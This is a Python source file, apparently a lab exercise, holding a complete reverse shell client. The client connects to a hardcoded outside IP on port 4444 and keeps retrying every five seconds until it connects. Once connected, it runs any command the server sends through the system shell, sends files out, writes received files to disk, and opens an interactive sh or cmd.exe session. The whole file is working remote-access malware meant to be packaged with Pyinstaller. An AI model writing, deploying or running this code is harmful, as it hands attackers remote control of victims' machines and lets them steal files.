# client.py
#
# Name: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Build a TCP Python reverse shell with Pyinstaller
#
# This Python script implements a reverse shell client that connects to a remote server over a TCP socket. 
# Once connected, it can handle multiple commands sent from the server, including command execution, file uploads, 
# downloads, and initiating an interactive shell session. The client continuously listens for instructions 
# from the server, executes commands locally, and returns the output, while managing connections 
# gracefully to handle disconnects and unexpected errors.

import socket
import subprocess
import os
import threading
import time

class Client:
    def __init__(self, server_host, server_port):
        # Initialize the client with the server's address and port
        self.server_host = server_host
        self.server_port = server_port
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        # Attempt to connect to the server, retrying every 5 seconds if the connection fails
        while True:
            try:
                self.conn.connect((self.server_host, self.server_port))
                self.handle_connection()
                break
            except Exception as e:
                time.sleep(5)

    def close(self):
        # Close the connection to the server
        self.conn.close()

    def handle_connection(self):
        # Main loop to handle incoming commands from the server
        try:
            while True:
                command = self.receive_command()
                if command == "exit":
                    self.close()
                    os._exit(0)
                elif command.startswith("upload "):
                    _, remote_file_path, file_size = command.split(" ", 2)
                    self.receive_file(remote_file_path, int(file_size))  # Handle file upload
                elif command.startswith("download "):
                    _, remote_file_path = command.split(" ", 1)
                    self.send_file(remote_file_path)  # Handle file download
                elif command == "shell":
                    self.handle_shell()  # Start an interactive shell session
                else:
                    self.execute_command(command)  # Execute any other command
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            self.close()  # Ensure the connection is closed on exit

    def receive_command(self):
        # Read a command from the server one character at a time until a newline is received
        data = ''
        while True:
            c = self.conn.recv(1).decode()
            if c == '\n':
                break
            data += c
        return data.strip()

    def send_file(self, remote_file_path):
        # Send a file to the server, including its size for easier management on the server side
        try:
            with open(remote_file_path, 'rb') as f:
                file_size = os.path.getsize(remote_file_path)
                self.conn.sendall(f"{file_size}\n".encode())  # Send file size first
                while chunk := f.read(4096):
                    self.conn.sendall(chunk)  # Send file in chunks
        except Exception as e:
            self.conn.sendall("0\n".encode())  # Send "0" if file transfer fails

    def receive_file(self, remote_file_path, file_size):
        # Receive a file from the server and save it locally
        try:
            with open(remote_file_path, 'wb') as f:
                remaining = file_size
                while remaining > 0:
                    data = self.conn.recv(min(4096, remaining))
                    if not data:
                        break
                    f.write(data)
                    remaining -= len(data)
        except Exception as e:
            print(f"Error receiving file {remote_file_path}: {e}")

    def execute_command(self, command):
        # Execute a shell command and send the output back to the server
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            self.conn.sendall(output + b'\n')  # Send command output
        except subprocess.CalledProcessError as e:
            self.conn.sendall(e.output + b'\n')  # Send error output if command fails

    def handle_shell(self):
        # Start an interactive shell session, forwarding server input to the shell and output back to the server
        try:
            # Run shell interactively for Linux, and cmd.exe for Windows
            shell = subprocess.Popen(
                ['cmd.exe'] if os.name == 'nt' else ['/bin/sh', '-i'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )

            def read_from_socket():
                # Forward data from server to the shell's stdin
                while True:
                    data = self.conn.recv(4096)
                    if not data:
                        break
                    if data.strip() == b"exit":
                        shell.terminate()  # End the shell session if "exit" is received
                        self.close()
                        os._exit(0)
                    shell.stdin.write(data)
                    shell.stdin.flush()

            def write_to_socket():
                # Send shell's stdout back to the server
                while True:
                    data = shell.stdout.read(1)
                    if not data:
                        break
                    self.conn.sendall(data)

            # Start threads to handle bidirectional communication
            recv_thread = threading.Thread(target=read_from_socket)
            send_thread = threading.Thread(target=write_to_socket)
            recv_thread.start()
            send_thread.start()
            recv_thread.join()
            send_thread.join()
        except Exception as e:
            print(f"Shell session error: {e}")

def main():
    # Initialize and connect the client to the specified server
    client = Client('9.53.99.47', 4444)
    client.connect()

if __name__ == '__main__':
    main()
